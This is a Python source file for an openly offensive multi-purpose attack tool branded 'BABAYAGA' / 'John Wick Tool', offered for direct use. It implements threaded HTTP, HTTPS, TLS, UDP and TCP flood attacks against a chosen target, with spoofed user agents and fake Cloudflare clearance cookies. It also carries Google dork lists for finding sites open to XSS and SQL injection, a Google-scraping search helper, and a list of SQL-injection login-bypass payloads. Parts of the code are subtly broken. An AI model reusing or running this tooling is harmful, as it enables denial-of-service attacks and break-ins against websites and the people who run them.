from os import system
from colorama import Fore , init
from fake_useragent import UserAgent
from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , gethostbyname
from threading import Thread as thr
from os import name
from certifi import where
from ssl import CERT_NONE, create_default_context
from random import choice
from string import ascii_letters , digits
from urllib.parse import urlparse
from random import random , choice
from os import getpid
from os import kill as killx
from requests import get
from bs4 import BeautifulSoup
from datetime import datetime
from base64 import b64encode , b64decode

init()

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

system('cls' if name == 'nt' else 'clear')

banner = f'''

                           {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                            ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                            ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                            ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                            ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                            ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
                            ░    ░   ░   ▒    ░    ░   ░   ▒       ▒ ▒ ░░    ░   ▒   ░ ░   ░   ░   ▒   
                            ░            ░  ░ ░            ░  ░    ░ ░           ░  ░      ░       ░  ░
                                ░                 ░               ░ ░  {green}           
                                                                                                           

            {cyan}╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
            {cyan}║                                  {red}Welcome {blue}To {yellow}BABAYAGA {green}TOOL{cyan}                                       ║
            {cyan}║                                                                                                 ║
            {cyan}║ {green}DDoS{red}-{green}Attack {green}Tool {red}({cyan} LAYER4 {red}&{cyan} LAYER7{red} ){cyan} {red}({cyan} ddos {red}){cyan}                                                   ║
            {cyan}║ {green}CROSS SITE SCRIPTING {red}( {cyan}XSS DORK {red}){cyan} {red}({cyan} dork-xss {red}){cyan}                                                  ║
            {cyan}║ {green}SQL INJECTION {red}({cyan} DORK {red}){cyan} {red}( {cyan}dork-sql {red}) {cyan}                                                            ║
            {cyan}║ {green}XSS DORK SEARCH IN {red}({cyan} GOOGLE {red}){cyan} {red}( {cyan}search-xss {red}) {cyan}                                                   ║
            {cyan}║ {green}SQL INJECTION SEARCH IN {red}({cyan} GOOGLE {red}){cyan} {red}( {cyan}search-sql {red}){cyan}                                               ║
            {cyan}║ {green}BYPASS LOGIN {red}({cyan} SQL INJECTION PAYLOAD {red}){cyan} {red}( {cyan}dork-bypasslogin {red})  {cyan}                                   ║
            {cyan}║ {green}GET WEBSITE IP ADDRES WITH {red}({cyan} URL {red}){cyan} {red}({cyan} ip {red})  {cyan}                                                     ║
            {cyan}║ {green}FAKE COOKIE GANERATOR{red} ({cyan} PHPSSID {red}){cyan} {red}( {cyan}fake-cookie {red}){cyan}                                               ║
            {cyan}║ {green}WAF DETECTION {red}({cyan} WEB APPLICATION FIREWALL DETECTION {red}) ({cyan} WAF {red}){cyan}                                    ║
            {cyan}║ {green}ENCODE A DECODED WORD {red}({cyan} ENCODER {red}) ({cyan} ENCODE {red}){cyan}                                                    ║
            {cyan}║ {green}DECODE A ENCODED WORD {red}({cyan} DECODER {red}) ({cyan} DECODE {red}){cyan}                                                    ║
            {cyan}║ {green}CHECK WEBSITE STATUS {red}({cyan} STATUS CODE {red}) ({cyan} STATUS {red}){cyan}                                                 ║
            {cyan}║                                                                                                 ║
            {cyan}║ {red}#{green}John {yellow}Wick{blue} Tool{cyan}                                                                                 ║
            {cyan}╚═════════════════════════════════════════════════════════════════════════════════════════════════╝
                                                                
'''

ddos = f'''


                           {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                            ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                            ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                            ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                            ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                            ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
                            ░    ░   ░   ▒    ░    ░   ░   ▒       ▒ ▒ ░░    ░   ▒   ░ ░   ░   ░   ▒   
                            ░            ░  ░ ░            ░  ░    ░ ░           ░  ░      ░       ░  ░
                                ░                 ░               ░ ░  {green}           
                                    ░                                                  
                                                                                                           

            {cyan}╔═════════════════════════════════════════════════════════════════════════════════════════════════╗
            {cyan}║                                  {red}Welcome {blue}To {yellow}JOHNWICK {green}TOOL{cyan}                                       ║
            {cyan}║                                                                                                 ║
            {cyan}║ {green}LAYER7 {red}: {cyan}HTTP {red}, {cyan}HTTPS , tls                                                                     ║
            {cyan}║ {green}LAYER4 {red}: {cyan}UDP {red}, {cyan}TCP                                                                              ║
            {cyan}║                                                                                                 ║
            {cyan}║ {red}#{green}John {yellow}Wick{blue} Tool{cyan}                                                                                 ║
            {cyan}╚═════════════════════════════════════════════════════════════════════════════════════════════════╝

'''

bn = f'''

                           {white} ▄▄▄▄    ▄▄▄       ▄▄▄▄    ▄▄▄         ▓██   ██▓ ▄▄▄        ▄████  ▄▄▄      
                            ▓█████▄ ▒████▄    ▓█████▄ ▒████▄        ▒██  ██▒▒████▄     ██▒ ▀█▒▒████▄    
                            ▒██▒ ▄██▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄       ▒██ ██░▒██  ▀█▄  ▒██░▄▄▄░▒██  ▀█▄   {green}Created {red}By {yellow}John {blue}Wick{blue}		
                            ▒██░█▀  ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██      ░ ▐██▓░░██▄▄▄▄██ ░▓█  ██▓░██▄▄▄▄██   {cyan}Version {red}({yellow} 1{red}.{yellow}3{red} ){red}
                            ░▓█  ▀█▓ ▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒     ░ ██▒▓░ ▓█   ▓██▒░▒▓███▀▒ ▓█   ▓██▒
                            ░▒▓███▀▒ ▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░      ██▒▒▒  ▒▒   ▓▒█░ ░▒   ▒  ▒▒   ▓▒█░
                            ▒░▒   ░   ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░    ▓██ ░▒░   ▒   ▒▒ ░  ░   ░   ▒   ▒▒ ░
                            ░    ░   ░   ▒    ░    ░   ░   ▒       ▒ ▒ ░░    ░   ▒   ░ ░   ░   ░   ▒   
                            ░            ░  ░ ░            ░  ░    ░ ░           ░  ░      ░       ░  ░
                                ░                 ░               ░ ░  {green}                               
'''

dork_xss = '''

        inurl:".php?cmd="
        inurl:".php?z="
        inurl:".php?q="
        inurl:".php?search="
        inurl:".php?query="
        inurl:".php?searchst­ring="
        inurl:".php?keyword=­"
        inurl:".php?file="
        inurl:".php?years="
        inurl:".php?txt="
        inurl:".php?tag="
        inurl:".php?max="
        inurl:".php?from="
        inurl:".php?author="
        inurl:".php?pass="
        inurl:".php?feedback­="
        inurl:".php?mail="
        inurl:".php?cat="
        inurl:".php?vote="
        inurl:search.php?q=
        inurl:com_feedpostol­d/feedpost.php?url=
        inurl:scrapbook.php?­id=
        inurl:headersearch.p­hp?sid=
        inurl:/poll/­default.asp?catid=
        inurl:/­search_results.php?se­arch=
        inurl:categoryId inurl:storeId
        inurl:resultCatEntryType
        inurl:searchTermScope
        inurl:”webapp/wcs”
        inurl:”ProductListingView”
        inurl:”AdvancedSearchDisplay”
        inurl:”CompareProductsDisplayView=”
        inurl:parent_category_rn=

'''

dork_sqll = '''

        view_items.php?id=
        home.php?cat=
        item_book.php?CAT=
        www/index.php?page=
        schule/termine.php?view=
        goods_detail.php?data=
        storemanager/contents/item.php?page_code=
        view_items.php?id=
        customer/board.htm?mode=
        help/com_view.html?code=
        n_replyboard.php?typeboard=
        eng_board/view.php?T****=
        prev_results.php?prodID=
        bbs/view.php?no=
        gnu/?doc=
        zb/view.php?uid=
        global/product/product.php?gubun=
        m_view.php?ps_db=
        productlist.php?tid=
        product-list.php?id=
        onlinesales/product.php?product_id=
        garden_equipment/Fruit-Cage/product.php?pr=
        product.php?shopprodid=
        product_info.php?products_id=
        productlist.php?tid=
        showsub.php?id=
        productlist.php?fid=
        products.php?cat=
        products.php?cat=
        product-list.php?id=
        product.php?sku=
        store/product.php?productid=
        products.php?cat=
        productList.php?cat=
        product_detail.php?product_id=
        product.php?pid=
        view_items.php?id=
        more_details.php?id=
        county-facts/diary/vcsgen.php?id=
        idlechat/message.php?id=
        podcast/item.php?pid=
        products.php?act=
        details.php?prodId=
        socsci/events/full_details.php?id=
        ourblog.php?categoryid=
        mall/more.php?ProdID=
        archive/get.php?message_id=
        review/review_form.php?item_id=
        english/publicproducts.php?groupid=
        news_and_notices.php?news_id=
        rounds-detail.php?id=
        gig.php?id=
        board/view.php?no=
        index.php?modus=
        news_item.php?id=
        rss.php?cat=
        products/product.php?id=
        details.php?ProdID=
        els_/product/product.php?id=
        store/description.php?iddesc=
        socsci/news_items/full_story.php?id=
        naboard/memo.php?bd=
        bookmark/mybook/bookmark.php?bookPageNo=
        board/board.html?table=
        kboard/kboard.php?board=
        order.asp?lotid=
        goboard/front/board_view.php?code=
        bbs/bbsView.php?id=
        boardView.php?bbs=
        eng/rgboard/view.php?&bbs_id=
        product/product.php?cate=
        content.php?p=
        page.php?module=
        ?pid=
        bookpage.php?id=
        cbmer/congres/page.php?LAN=
        content.php?id=
        news.php?ID=
        photogallery.php?id=
        index.php?id=
        product/product.php?product_no=
        nyheder.htm?show=
        book.php?ID=
        print.php?id=
        detail.php?id=
        book.php?id=
        content.php?PID=
        more_detail.php?id=
        content.php?id=
        view_items.php?id=
        view_author.php?id=
        main.php?id=
        english/fonction/print.php?id=
        magazines/adult_magazine_single_page.php?magid=
        product_details.php?prodid=
        magazines/adult_magazine_full_year.php?magid=
        products/card.php?prodID=
        catalog/product.php?cat_id=
        e_board/modifyform.html?code=
        community/calendar-event-fr.php?id=
        products.php?p=
        news.php?id=
        StoreRedirect.php?ID=
        subcategories.php?id=
        tek9.php?
        template.php?Action=Item&pid=
        topic.php?ID=
        tuangou.php?bookid=
        type.php?iType=
        updatebasket.php?bookid=
        updates.php?ID=
        view.php?cid=
        view_cart.php?title=
        view_detail.php?ID=
        viewcart.php?CartId=
        viewCart.php?userID=

'''

bypass_login = '''

        ' or 1=1 limit 1 -- -+
        '="or'
        or 1=1
        or 1=1--
        or 1=1#
        or 1=1/*
        admin' --
        admin' #
        admin'/*
        admin' or '1'='1
        admin' or '1'='1'--
        admin' or '1'='1'#
        admin' or '1'='1'/*
        admin'or 1=1 or ''='
        admin' or 1=1
        admin' or 1=1--
        admin' or 1=1#
        admin' or 1=1/*
        admin') or ('1'='1
        admin') or ('1'='1'--
        admin') or ('1'='1'#
        admin') or ('1'='1'/*
        admin') or '1'='1
        admin') or '1'='1'--
        admin') or '1'='1'#
        admin') or '1'='1'/*
        1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
        admin" --
        admin" #
        admin"/*
        admin" or "1"="1
        admin" or "1"="1"--
        admin" or "1"="1"#
        admin" or "1"="1"/*
        admin"or 1=1 or ""="
        admin" or 1=1
        admin" or 1=1--
        admin" or 1=1#
        admin" or 1=1/*
        admin") or ("1"="1
        admin") or ("1"="1"--
        admin") or ("1"="1"#
        admin") or ("1"="1"/*
        admin") or "1"="1
        admin") or "1"="1"--
        admin") or "1"="1"#
        admin") or "1"="1"/*

'''

print(banner)

while True:
    try:
        c2 = input(Fore.LIGHTRED_EX+"\n ╔═══"+Fore.LIGHTYELLOW_EX+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTYELLOW_EX+"WICK-TOOL"+Fore.LIGHTRED_EX+"]"+Fore.LIGHTRED_EX+"\n ╚══\x1b[38;2;0;255;189m>>> "+Fore.LIGHTGREEN_EX)

        try:
            method = str(c2.split()[0])
            url = str(c2.split()[1])
            port = int(c2.split()[2])
            threads = int(c2.split()[3])
            rpc = int(c2.split()[4])
            timme = int(c2.split()[5])
        except:
            pass

        us = UserAgent()
        ua = us.random

        ssl = create_default_context(cafile=where())
        ssl.check_hostname = False
        ssl.verify_mode = CERT_NONE

        try:
            def generate_fake_phpsessid(length):
                characters = ascii_letters + digits
                fake_phpsessid = ''.join(choice(characters) for _ in range(length))
                return fake_phpsessid

            fake_cookie_phpsessid = generate_fake_phpsessid(147)
            fake_cookie_phpsessidd = generate_fake_phpsessid(32)
            cookie = ("cf_clearance="+fake_cookie_phpsessid, "PHPSSID="+fake_cookie_phpsessidd)
            cookie2 = ("PHPSSID="+fake_cookie_phpsessidd)
        except:
            pass

        try:
            if url.split('://')[0] == 'https' or 'http':
                parsed_url = urlparse(url)
                target = parsed_url.netloc
                path = parsed_url.path
            else:
                pass
        except:
            pass

        def http():
            while True:
                try:
                    if url.split('://')[0] == 'https':
                        s = socket(AF_INET,SOCK_STREAM)
                        s = ssl.wrap_socket(s, server_hostname=target)
                        s.connect((target,port))
                    else:
                        s = socket(AF_INET,SOCK_STREAM)
                        s.connect((target,port))
                    for _ in range(rpc):
                        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n').encode()
                except:
                    pass

        def https():
            while True:
                try:
                    if url.split('://')[0] == 'https':
                        s = socket(AF_INET,SOCK_STREAM)
                        s = ssl.wrap_socket(s, server_hostname=target)
                        s.connect((target,port))
                    else:
                        s = socket(AF_INET,SOCK_STREAM)
                        s.connect((target,port))
                    for _ in range(rpc):
                        s.send(f'GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n'.encode())
                except:
                    pass

        def tls():
            while True:
                try:
                    if url.split('://')[0] == 'https':
                        s = socket(AF_INET,SOCK_STREAM)
                        s = ssl.wrap_socket(s, server_hostname=target)
                        s.connect((target,port))
                    else:
                        s = socket(AF_INET,SOCK_STREAM)
                        s.connect((target,port))
                    for _ in range(rpc):
                        s.send(f'GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nUpgrade-Insecure-Requests: 1\r\nCookie: {cookie}\r\n\r\n'.encode())
                except:
                    pass

        def udp():
            while True:
                try:
                    s = socket(AF_INET,SOCK_DGRAM)
                    payl = random._urandom(1024)
                    for _ in range(rpc):
                        s.sendto(payl.encode(), (target,port))
                except:
                    pass

        def tcp():
            while True:
                try:
                    s = socket(AF_INET,SOCK_STREAM)
                    s.connect((target,port))
                    payl = random._urandom(1024)
                    for _ in range(rpc):
                        s.send(payl.encode())
                except:
                    pass

        def xss_dork():
            print(bn)
            print(dork_xss)

        def sql_dork():
            print(bn)
            print(dork_sqll)

        def search(dork):
            url = f"https://www.google.com/search?q={dork}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'}
            response = get(url, headers=headers)
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                urls = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith("http")]
                return urls
            else:
                return []

        def waff():
            try:
                now = datetime.now()
                current_datetime = datetime.now()
                date = current_datetime.date()
                timee = now.strftime('%H:%M:%S')

                response = get(f"http://ip-api.com/json/{target}")
                response.raise_for_status()
                data = response.json()

                isp = data['as']
                city = data['city']
                zone = data['timezone']
            except:
                pass
            system('cls' if name == 'nt' else 'clear')
            print(bn)
            print(f'''                        {cyan}╔══════════════════════════════════════════════════════════════════╗
                        {yellow} Date   {red}: {green}{date}
                        {yellow} Time   {red}: {green}{timee}
                        {yellow} Isp    {red}: {green}{isp}
                        {yellow} Zone   {red}: {green}{zone}
                        {yellow} City   {red}: {green}{city}
                        {cyan}╚══════════════════════════════════════════════════════════════════╝''')
        
        def bypass_loginn():
            system('cls' if name == 'nt' else 'clear')
            print(bn)
            print(bypass_login)

        def encoder():
            strr = input(f'\n  {green}DECODED WORD {red}:{cyan} ')
            encoderr = b64encode(strr.encode('utf-8')).decode('utf-8') 
            print(f'{cyan}\n  ENCODED WORD {red}={green} {encoderr}')

        def decoder():
            strr = input(f'\n  {green}ENCODED WORD {red}:{cyan} ')
            fff = strr.encode("ascii")
            decoder = b64decode(fff).decode("ascii")
            print(f'{cyan}\n  DECODED WORD {red}={green} {decoder}')

        def status_code():
            rt = get(url)
            rs = rt.status_code
            system('cls' if name == 'nt' else 'clear')
            print(bn)
            print(f"""                            {cyan}╔══════════════════════════════════════════════════════════════════╗

                                    {yellow} Response {red}: {green}{rs}
                                    {yellow} Target   {red}: {green}{url}

                            {cyan}╚══════════════════════════════════════════════════════════════════╝""")

        if method == 'ddos':
            system('cls' if name == 'nt' else 'clear')
            print(ddos)
        elif method == 'http':
            print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
            for _ in range(threads):
                thr(target=http).start()
        elif method == 'https:':
            print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
            for _ in range(threads):
                thr(target=https).start()
        elif method == 'udp':
            print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
            for _ in range(threads):
                thr(target=udp).start()
        elif method == 'tcp':
            print(Fore.LIGHTRED_EX+"\n["+Fore.LIGHTYELLOW_EX+"$"+Fore.LIGHTRED_EX+"]", Fore.LIGHTGREEN_EX + "Attack", Fore.LIGHTCYAN_EX + "Started", Fore.LIGHTYELLOW_EX + "!" + Fore.LIGHTRED_EX + "!" + Fore.LIGHTGREEN_EX + "!")
            for _ in range(threads):
                thr(target=tcp).start()
        elif method == 'dork-bypasslogin':
            bypass_loginn()
        elif method == 'dork-xss':
            system('cls' if name == 'nt' else 'clear')
            xss_dork()
        elif method == 'dork-sql':
            system('cls' if name == 'nt' else 'clear')
            sql_dork()
        elif method == 'search-sql':
            dork = input(f'\n  {green}Dork {cyan}Pls {red}:{green} ')
            print(f'{cyan}  ')
            results = search(dork)
            for url in results:
                print(results)
        elif method == 'search-xss':
            dork = input(f'\n  {green}Dork {cyan}Pls {red}:{green} ')
            results = search(dork)
            for url in results:
                print(f'{cyan}  ')
                print(results)
        elif method == 'fake-cookie':
            print(f'\n  {blue}FAKE COOKIE {red}:{green} {cookie2}')
        elif method == 'waf':
            waff()
        elif method == 'encode':
            encoder()
        elif method == 'decode':
            decoder()
        elif method == 'status':
            status_code()
        elif method == 'exit':
            system('cls' if name == 'nt' else 'clear')
            killx(getpid(), 9)
        elif method == 'ip':
            ff = gethostbyname(target)
            print(f'\n  {green}IP ADDRES {red}( {cyan}{target} {red}) : {white}{ff}')
        elif method == 'clear':
            system('cls' if name == 'nt' else 'clear')
            print(banner)
    except:
        pass
